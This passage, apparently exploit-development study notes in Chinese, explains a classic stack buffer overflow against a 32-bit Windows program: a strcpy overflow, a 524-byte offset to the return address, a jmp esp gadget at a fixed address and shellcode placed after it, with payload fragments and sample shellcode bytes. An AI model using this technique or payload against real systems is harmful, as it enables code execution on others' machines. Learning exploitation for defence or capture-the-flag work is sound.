strcpy(&Dest, Source);
```

strcpy 的规则只有一条：

**我不管你 Dest 多大，我一直复制，直到 Source 遇到 \0**

所以当你输入很长时，内存会变成这样：

```plain
[ Dest buffer        ]  ← aaaaaaaa
[ 覆盖的其他局部变量 ]  ← aaaaaaaa
[ 覆盖的旧 EBP       ]  ← aaaaaaaa
[ 覆盖的返回地址 RET ]  ← 0x311712f3
[ 后续数据           ]  ← shellcode
```

⚠️ 注意：**shellcode 就在返回地址后面**

---

### 第四步：函数“返回”的瞬间发生了什么？
函数结束时，会执行：

```plain
ret
```

`ret` 做的事情只有一件：

**从 ESP 指向的位置取 4 字节 → 放进 EIP**

#### 那这时 ESP 指向哪？
这是重点👇

在 `ret` 之前，栈长这样：

```plain
ESP → [ 返回地址（被你覆盖） ]
       [ shellcode 字节 1 ]
       [ shellcode 字节 2 ]
       [ shellcode 字节 3 ]
       ...
```

当 `ret` 执行：

1. CPU 从 `[ESP]` 取地址 → EIP
2. **ESP 自动 +4**

于是变成：

```plain
ESP → [ shellcode 的起始位置 ]
```

💥 **这就是关键结论**

---

### 第五步：所以为什么 `ESP 一定指向你的数据`？
现在我们可以严谨地说了：

#### 因为：
1. 你的输入被 `strcpy` 写进了栈
2. 返回地址后面紧跟着的就是你输入的内容
3. `ret` 会让 ESP 指向 **返回地址后 4 字节**
4. 那里正是你的 shellcode

✅ 所以：

**在 ret 之后，ESP 指向的，就是你刚刚写进去的数据**

---

#### 第六步：这就是为什么 `jmp esp` 是“完美跳板”
你现在应该能真正理解这句话了：

```plain
jmp esp
```

人话翻译：

**“不管你 shellcode 在哪，我就跳到 ESP 指向的地方”**

而 ESP 指向哪里？

**指向你写在栈上的 payload**

---

### 用一句完整 链总结（非常重要）
strcpy 溢出 → 覆盖返回地址 → ret 后 ESP 指向 shellcode → 返回地址设为 jmp esp → EIP 跳到 ESP → 执行你的代码

这就是你整个 EXP 的**数学证明级解释**。

# 总结
+ ✔ **524 字节是为了覆盖到返回地址**
+ ✔ **返回地址被我们控制成 **`**jmp esp**`
+ ✔ **最终会执行 shellcode**



## ① 覆盖栈帧（为什么是 524）
在 `get_reply` 中：

```plain
char Dest; // [ebp-0x208]
```

栈结构是：

```plain
[ Dest buffer  ] 0x208 = 520 bytes
[ saved EBP    ] 4 bytes
[ RET address  ] 4 bytes
```

👉 到返回地址的偏移：

```plain
520 + 4 = 524
```

所以：

```plain
junk = b"A" * 524
```

**这一句的本质是：**

把返回地址“踩掉”

---

## ② ret 做的事情（这一点你要永远记住）
函数结束时执行：

```plain
leave
ret
```

### ret 的真实行为：
```plain
EIP = [ESP]
ESP = ESP + 4
```

所以当你把返回地址写成：

```plain
ret_addr = p32(0x311712f3)  # jmp esp
```

执行 `ret` 后：

+ `EIP = jmp esp`
+ `ESP`**自动指向返回地址后面的内容**

---

## ③ 为什么 shellcode 一定要放在 ret 后面？
你的 payload 是：

```plain
[ A * 524 ][ jmp esp ][ shellcode ]
```

执行 `ret` 后：

```plain
ESP → shellcode
EIP → jmp esp
```

然后 CPU 执行：

```plain
jmp esp
```

含义是：

**跳到 ESP 当前指向的位置**

而 ESP 正好指向 shellcode

---

## ④ 所以完整链路是（这是终极版本）
`strcpy 溢出  
↓  
覆盖返回地址  
↓  
ret → EIP = jmp esp  
↓  
ESP 自动指向 shellcode  
↓  
jmp esp → 跳到 shellcode  
↓  
shellcode 执行`



**因为在 32 位程序里，一个地址 = 4 个字节，而 **`**ret**`** 就是从栈里“弹出一个地址”。**

**弹出一个地址 = 4 字节  
****所以：ESP = ESP + 4**

---

# 为什么“一个地址是 4 字节”？
你现在分析的是：

```plain
PE32 executable
Intel 80386
i386
```

也就是 **32 位程序**

### 在 32 位 CPU 中：
+ 寄存器宽度：32 bit
+ 32 bit = **4 byte**

所以：

| 东西 | 大小 |
| --- | --- |
| int | 4 字节 |
| 指针 | 4 字节 |
| 返回地址 | **4 字节** |
| EIP | 4 字节 |


👉 **返回地址本身就是一个“指针”**

---

## ret 本质上是在“弹栈”
你要把 `ret` 当成一句 **伪代码**：

```plain
EIP = *(uint32_t *)ESP;
ESP += 4;
```

翻译成人话就是：

1. 从 ESP 指向的地方，取 **4 字节**
2. 当成下一条要执行的地址（给 EIP）
3. ESP 往上挪 **4 字节**（栈顶弹出）

---

## 用真实栈内存给你画一遍（关键）
### 假设当前 ESP = `0xffffd200`
内存里是这样：

```plain
地址        内容
--------------------------------
0xffffd200  f3 12 17 31   ← 返回地址（jmp esp）
0xffffd204  31 c0 50 68   ← shellcode 第 1 条
0xffffd208  2f 2f 73 68
```

### 执行 `ret` 时：
#### 第一步：
```plain
EIP = *(0xffffd200)
EIP = 0x311712f3
```

#### 第二步：
```plain
ESP = ESP + 4
ESP = 0xffffd204
```

📌 注意：

```plain
ESP 现在 = shellcode 的起始地址
```

---

## 这就是为什么 shellcode 会“紧挨着 ESP”
不是因为 shellcode 特殊，而是：

+ ret **只弹出返回地址**
+ 返回地址占 **4 字节**
+ ESP 必须跳过它
+ 所以后面的数据自然就成了 ESP 指向的内容

👉 **这是 CPU 的铁律，不是技巧**

---

## 类比一个“你肯定懂”的东西（很重要）
把栈想成一摞盘子：

```plain
最上面
┌──────────────┐
│ 返回地址     │  ← 1 个盘子（4 字节）
├──────────────┤
│ shellcode    │
│ shellcode    │
└──────────────┘
```

### ret = 拿走最上面一个盘子
+ 拿走返回地址
+ 手自然就放到下面那一层

👉 **ESP 就是“你的手”**

---

## 你现在应该能自己回答这个问题了
为什么 ESP = ESP + 4？

因为：

+ 栈里存的是 **32 位返回地址**
+ 32 位 = 4 字节
+ ret 要把这个地址“弹掉”
+ 所以 ESP 必须前进 4 字节



